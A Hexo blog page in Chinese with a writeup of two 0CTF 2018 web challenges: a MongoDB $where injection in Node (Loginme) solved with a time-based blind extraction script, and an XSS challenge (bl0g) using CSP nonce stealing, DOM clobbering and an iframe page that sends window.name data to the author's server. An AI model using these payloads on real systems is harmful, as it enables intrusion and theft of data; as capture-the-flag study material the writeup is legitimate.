@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          2018 0ctf-部分writeup - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/04/2018-0ctf-loginme/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>2018 0ctf-部分writeup</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-04-10
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这星期补了下js、nodejs基础，决定回过头来再看一下这些题 每个都是看了很久才看懂具体在操作什么 所以，讲熟练掌握这个技巧了是不太可能，只能做下记录  </p>
+<h1 id="Loginme"><a href="#Loginme" class="headerlink" title="Loginme"></a>Loginme</h1><p>先贴一下源码，加粗一下个人认为最重要的一个代码块<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> path    = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"><span class="keyword">var</span> moment = <span class="built_in">require</span>(<span class="string">'moment'</span>);</span><br><span class="line"><span class="keyword">var</span> MongoClient = <span class="built_in">require</span>(<span class="string">'mongodb'</span>).MongoClient;</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"mongodb://localhost:27017/"</span>;</span><br><span class="line"></span><br><span class="line">MongoClient.connect(url, <span class="function"><span class="keyword">function</span>(<span class="params">err, db</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    dbo = db.db(<span class="string">"test_db"</span>);</span><br><span class="line">    <span class="keyword">var</span> collection_name = <span class="string">"users"</span>;</span><br><span class="line">    <span class="keyword">var</span> password_column = <span class="string">"password_"</span>+<span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">var</span> password = <span class="string">"XXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">    <span class="comment">// flag is flag&#123;password&#125;</span></span><br><span class="line">    <span class="keyword">var</span> myobj = &#123; <span class="string">"username"</span>: <span class="string">"admin"</span>, <span class="string">"last_access"</span>: moment().format(<span class="string">'YYYY-MM-DD HH:mm:ss Z'</span>)&#125;;</span><br><span class="line">    myobj[password_column] = password;</span><br><span class="line">    dbo.collection(collection_name).remove(&#123;&#125;);</span><br><span class="line">    dbo.collection(collection_name).update(</span><br><span class="line">        &#123; <span class="attr">name</span>: myobj.name &#125;,</span><br><span class="line">        myobj,</span><br><span class="line">        &#123; <span class="attr">upsert</span>: <span class="literal">true</span> &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.sendFile(path.join(__dirname,<span class="string">'index.html'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">    app.post(<span class="string">'/check'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> check_function = <span class="string">'if(this.username == #username# &amp;&amp; #username# == "admin" &amp;&amp; hex_md5(#password#) == this.'</span>+password_column+<span class="string">')&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> req.body)&#123;</span><br><span class="line">            <span class="keyword">var</span> valid = [<span class="string">'#'</span>,<span class="string">'('</span>,<span class="string">')'</span>].every(<span class="function">(<span class="params">x</span>)=&gt;</span>&#123;<span class="keyword">return</span> req.body[k].indexOf(x) == <span class="number">-1</span>&#125;);</span><br><span class="line">            <span class="keyword">if</span>(!valid) res.send(<span class="string">'Nope'</span>);</span><br><span class="line">            check_function = check_function.replace(</span><br><span class="line">                <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'#'</span>+k+<span class="string">'#'</span>,<span class="string">'gm'</span>)</span><br><span class="line">                ,<span class="built_in">JSON</span>.stringify(req.body[k]))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> query = &#123;<span class="string">"$where"</span> : check_function&#125;;</span><br><span class="line">        <span class="keyword">var</span> newvalue = &#123;<span class="attr">$set</span> : &#123;<span class="attr">last_access</span>: moment().format(<span class="string">'YYYY-MM-DD HH:mm:ss Z'</span>)&#125;&#125;</span><br><span class="line">        dbo.collection(collection_name).updateOne(query,newvalue,<span class="function"><span class="keyword">function</span> (<span class="params">e,r</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(e) <span class="keyword">throw</span> e;</span><br><span class="line">            res.send(<span class="string">'ok'</span>);</span><br><span class="line">            <span class="comment">// ... implementing, plz dont release this.</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    app.listen(<span class="number">8081</span>)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>讲一下大体代码流程：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对传入的<span class="built_in">post</span>键值对（key:<span class="built_in">value</span>）进行处理</span><br><span class="line">对每一个<span class="built_in">value</span>进行检测，不允许存在 <span class="string">'('</span>、<span class="string">')'</span>、<span class="string">'#'</span> 这几字符</span><br><span class="line">再进行一次 <span class="built_in">replace</span>( <span class="built_in">new</span> RegExp(<span class="string">'#'</span>+k+<span class="string">'#'</span>,<span class="string">'gm'</span>) ,JSON.stringify(req.body[k])) &#125;  的替换</span><br></pre></td></tr></table></figure></p>
+<p>有几个代码注入的重要点在于</p>
+<ul>
+<li>传入的post数据可以不是username和password</li>
+<li>可以利用 | 的方式隔开 #，构成正则的或判断符</li>
+<li>利用js的弱类型，传入数组，绕过（）的检测</li>
+</ul>
+<p>还是直接上payload把，感觉讲起来有点绕，直接看输出结果可能更容易理解<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="strong">*|=*</span><span class="strong">*&amp;*</span><span class="strong">*|this.*</span>word""\)|[]=<span class="code">+'X'+</span>*<span class="strong">*&amp;*</span><span class="strong">*|1;|[]=+sleep(300)+*</span><span class="strong">*&amp;*</span><span class="strong">*|(this.password_\w+)|[]=+$1.substr(0,1)+*</span><span class="strong">*&amp;*</span><span class="strong">*|"|=*</span><span class="strong">*</span></span><br></pre></td></tr></table></figure></p>
+<p>帮助理解的一些输出语句<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">match part :#,#,#,#,#,#                    <span class="comment">//  **|=**   替换掉所有的#,防止</span></span><br><span class="line">正在替换：| -----&gt; </span><br><span class="line">query: <span class="keyword">if</span>(<span class="keyword">this</span>.username == <span class="string">""</span>username<span class="string">""</span> &amp;&amp; <span class="string">""</span>username<span class="string">""</span> == <span class="string">"admin"</span> &amp;&amp; hex_md5(<span class="string">""</span>password<span class="string">""</span>) == <span class="keyword">this</span>.password_0ugfcbsrbms)&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">match part :<span class="keyword">this</span>.username == <span class="string">""</span>username<span class="string">""</span> &amp;&amp; <span class="string">""</span>username<span class="string">""</span> == <span class="string">"admin"</span> &amp;&amp; hex_md5(<span class="string">""</span>password<span class="string">""</span>)</span><br><span class="line">正在替换：|<span class="keyword">this</span>.*word<span class="string">""</span>\)| -----&gt; +<span class="string">'X'</span>+   <span class="comment">// **|this.*word""\)|[]=+'X'+**    替换掉前面多余的字符串</span></span><br><span class="line">query: <span class="keyword">if</span>(<span class="string">"+'X'+"</span> == <span class="keyword">this</span>.password_0ugfcbsrbms)&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">match part :<span class="number">1</span>;</span><br><span class="line">正在替换：|<span class="number">1</span>;| -----&gt; +sleep(<span class="number">3000</span>)+       <span class="comment">//**|1;|[]=+sleep(300)+**    传入延时函数，以数组形式绕过（）检测</span></span><br><span class="line">query: <span class="keyword">if</span>(<span class="string">"+'X'+"</span> == <span class="keyword">this</span>.password_0ugfcbsrbms)&#123;<span class="keyword">return</span> [<span class="string">"+sleep(3000)+"</span>]&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">match part :<span class="keyword">this</span>.password_0ugfcbsrbms</span><br><span class="line">正在替换：|(<span class="keyword">this</span>.password_\w+)| -----&gt; +$<span class="number">1</span>.substr(<span class="number">0</span>,<span class="number">1</span>)+ <span class="comment">//**|(this.password_\w+)|[]=+$1.substr(0,1)+ 截断字符，单个比较**</span></span><br><span class="line">query: <span class="keyword">if</span>(<span class="string">"+'X'+"</span> == [<span class="string">"+this.password_0ugfcbsrbms.substr(0,1)+"</span>])&#123;<span class="keyword">return</span> [<span class="string">"+sleep(3000)+"</span>]&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">match part :<span class="string">","</span>,<span class="string">","</span>,<span class="string">","</span></span><br><span class="line">正在替换：|<span class="string">"| -----&gt;                   //  **|"</span>|=** 将单个引号变成成对的双引号空字符</span><br><span class="line">query: <span class="keyword">if</span>(<span class="string">""</span>+<span class="string">'X'</span>+<span class="string">""</span> == [<span class="string">""</span>+<span class="keyword">this</span>.password_0ugfcbsrbms.substr(<span class="number">0</span>,<span class="number">1</span>)+<span class="string">""</span>])&#123;<span class="keyword">return</span> [<span class="string">""</span>+sleep(<span class="number">3000</span>)+<span class="string">""</span>]&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后爆破的字节位置以及猜测的字符串和延时长度都以及被控制了，剩下的写个脚本跑就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests, string, time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://202.120.7.194:8081/check"</span></span><br><span class="line">char_range = string.printable</span><br><span class="line"><span class="comment">#base_payload = '''|=&amp;|this.*word""\)|=+'&#123;&#125;'+&amp;|1;|[]=+sleep(1500)+&amp;|(this.password_\w+)|[]=+$1.substr(&#123;&#125;,1)+&amp;|"|='''</span></span><br><span class="line"></span><br><span class="line">char_list = []</span><br><span class="line"><span class="keyword">for</span> char_len <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> list(char_range):</span><br><span class="line">		x = <span class="string">"+'&#123;&#125;'+"</span>.format(char)</span><br><span class="line">		y = <span class="string">'+$1.substr(&#123;&#125;,1)+'</span>.format(char_len)</span><br><span class="line">		data = &#123;<span class="string">'|'</span>:<span class="string">''</span>,<span class="string">'|this.*word""\)|'</span>:x,<span class="string">'|1;|[]'</span>:<span class="string">'+sleep(1000)+'</span>,<span class="string">'|(this.password_\w+)|[]'</span>:y,<span class="string">'|"|'</span>:<span class="string">''</span>&#125;</span><br><span class="line">		<span class="comment">#print(data)</span></span><br><span class="line">		start_time = time.time()</span><br><span class="line">		r = requests.post(url, data = data)</span><br><span class="line">		end_time = time.time()</span><br><span class="line">		<span class="keyword">if</span> end_time - start_time&gt;<span class="number">1</span>:</span><br><span class="line">			char_list.append(char)</span><br><span class="line">			print(<span class="string">''</span>.join(char_list))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag&#123;<span class="number">13</span>fc892df79a86494792e14dcbef25&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="bl0g"><a href="#bl0g" class="headerlink" title="bl0g"></a>bl0g</h1><p>题目进去是个留言板系统，可以提交留言，flag只有管理员能看到，也有提交页面url的链接，所以还是一道xss的题目<br>题目的SCP规则<br><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>:</span><br><span class="line"><span class="keyword">script-src</span> <span class="string">'self'</span> <span class="string">'unsafe-inline'</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Security-Policy</span>:</span><br><span class="line"><span class="keyword">default-src</span> <span class="string">'none'</span>; <span class="keyword">script-src</span> <span class="string">'nonce-hAovzHMfA+dpxVdTXRzpZq72Fjs='</span> <span class="string">'strict-dynamic'</span>; <span class="keyword">style-src</span> <span class="string">'self'</span>; <span class="keyword">img-src</span> <span class="string">'self'</span> data:; <span class="keyword">media-src</span> <span class="string">'self'</span>; <span class="keyword">font-src</span> <span class="string">'self'</span> data:; <span class="keyword">connect-src</span> <span class="string">'self'</span>; <span class="keyword">base-uri</span> <span class="string">'none</span></span><br></pre></td></tr></table></figure></p>
+<p>一开始不熟悉SCP，一直在想着怎么绕过SCP<br>插一个题外话——<strong>常规绕过SCP的方式</strong> 就比如利用浏览器的容错性<br>在一个script标签之前插入一个<code>&lt;script name=&quot;</code>的代码块，吃掉后面script标签的nonce的token<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">name</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script nonce="</span><span class="attr">scptoken</span>"&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>浏览器的容错性会让其解释为<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">script</span> <span class="built_in">name</span>=<span class="string">"&lt;script"</span> nonce=<span class="string">"scptoken"</span>&gt;&lt;/<span class="keyword">script</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>从而吃掉别人的标签 这里在提交留言的地方有三个参数<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/3973fee3a7fb3fbf5b940f4c30e31239.png" alt><br>title和content字段都进行的html编码暂时无法逃逸 还有一个effect特效标签，没有进行编码，可以导致用户插入代码<br>但插入的代码依旧收到scp的限制无法执行<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/acd8e5e3eb2cf713a059e0e6da520045.png" alt><br>这里允许插入文本的标签附近并没有其他script标签，js遇到无法解析的语法时就不会继续执行，所以之前的方法暂时也行不通 在这里，主要关注到两个js文件 config.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> effects = &#123;</span><br><span class="line">        <span class="string">'nest'</span>: [</span><br><span class="line">            <span class="string">'&lt;script src="/assets/js/effects/canvas-nest.min.js"&gt;&lt;/script&gt;'</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'3waves'</span>: [</span><br><span class="line">            <span class="string">'&lt;script src="/assets/js/effects/three.min.js"&gt;&lt;/script&gt;'</span>,</span><br><span class="line">            <span class="string">'&lt;script src="/assets/js/effects/three-waves.min.js"&gt;&lt;/script&gt;'</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'lines'</span>: [</span><br><span class="line">           <span class="string">'&lt;script src="/assets/js/effects/three.min.js"&gt;&lt;/script&gt;'</span>,</span><br><span class="line">           <span class="string">'&lt;script src="/assets/js/effects/canvas-lines.min.js"&gt;&lt;/script&gt;'</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'sphere'</span>: [</span><br><span class="line">           <span class="string">'&lt;script src="/assets/js/effects/three.min.js"&gt;&lt;/script&gt;'</span>,</span><br><span class="line">           <span class="string">'&lt;script src="/assets/js/effects/canvas-sphere.min.js"&gt;&lt;/script&gt;'</span></span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">article.js</span><br><span class="line"></span><br><span class="line">    $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">"body"</span>).append((effects[$(<span class="string">"#effect"</span>).val()]));</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
+<p>article.js通过找到id为effect的标签，选取其中的值，进而从config.js中选取对应的js文件加载到html中 这里有个重要的trick</p>
+<blockquote>
+<p>在js中，对于特定的form,iframe,applet,embed,object,img标签，我们可以通过设置id或者name来使得通过id或name获取标签</p>
+</blockquote>
+<p>意思是指，当html中存在一个<code>&lt;form id=&quot;my_form&quot;&gt;</code>时，可以直接通过my_form来获取这个标签， 验证一下：可以看到，确实是可以通过id直接获取到改fomr节点<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/102f88d55fd6426f1dbb4a9d580d82ef.png" alt><br>所以，接下来的思路就是通过控制article中的append的节点，插入至恶意代码 要做的有如下两件事</p>
+<ol>
+<li>注释掉config.js，否则无法控制想要的append节点的字符</li>
+<li>找一个可以存放恶意代码，又可以通过effects[$(“#effect”).val()] 方式取出的节点</li>
+</ol>
+<p>看看大佬们是如何操作的<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">effect</span>=name"&gt;&lt;form <span class="attribute">id</span>=effects <span class="attribute">name</span>=<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>看看效果<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/8c3d11c08a0e73469c9136f1722990ee.png" alt><br>成功弹窗，分析下页面html<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/2ee0083a1d05f66f96c4316acb7e7c50.png" alt><br>最后的<code>&lt;script&gt;</code>与config.js的<code>&lt;/script&gt;</code>进行了闭合 而且代码的最后，插入了<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的弹窗代码 分析下，插入代码的过程 查看下每个变量的值<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/3c28981161447502b7ac10766c4b2de1.png" alt><br>effects由于注释了config.js之后，又重新创建了一个id为effetcs的form 导致effects直接选出来的就是我们构造的form标签 $(‘#effect’)<br>则是通过我们代码最开头给effect标签的value设置了一个name，导致其值也变成了name<br>这样组合下来 effects[$(“#effect”).val()]  就变成了我们设置的那个form中name的值，而这个点恰好又是我们能控制的 从而产生了弹窗 </p>
+<p>接下来在引入两个问题</p>
+<ul>
+<li>effect字符的输入有长度限制</li>
+<li>如何通过js获取flag的值，并发送给自己</li>
+</ul>
+<p>提供一个别人的js<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.<span class="keyword">get</span>('/flag',e=&gt;name=e)</span></span><br></pre></td></tr></table></figure></p>
+<p>通过jquery，发送一个get请求，并将请求的值返回给window.name<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/5e280e64b80986c150c6187c3ebbe934.png" alt><br>根据window.name可以跨域传输的性质，接下来还一个任意转跳的链接<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">202.120.7.197:8090</span>/login?next=%2F</span><br></pre></td></tr></table></figure></p>
+<p>通过修改next参数，可以跳转到任意链接 这样提交恶意url的时候，就可以指向自己构造的一个页面，然后切入iframe标签，获取window.name<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://202.120.7.197:8090/article/3816"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"> setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;frames[<span class="number">0</span>].window.location.href=<span class="string">'/'</span>&#125;,<span class="number">1200</span>)</span></span><br><span class="line"><span class="javascript"> setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;location.href=<span class="string">'http://xss.kingkk.com/?'</span>+frames[<span class="number">0</span>].window.name&#125;,<span class="number">1500</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>就获取了iframe标签中的window.name，并发送往自己的服务器，可在log文件中查看flag<br><img src="http://blog.kingkk.com/wp-content/uploads/2018/04/759253fc33fc0de9311fd06e79ec08f2.png" alt><br>将指定链接发给xssbot即可获得flag</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/04/xctf-hibtweb-writeup/" data-toggle="tooltip" data-placement="top" title="XCTF-HIBTweb writeup">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/04/mongodb基础操作及基础注入/" data-toggle="tooltip" data-placement="top" title="Mongodb基础操作及基础注入">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
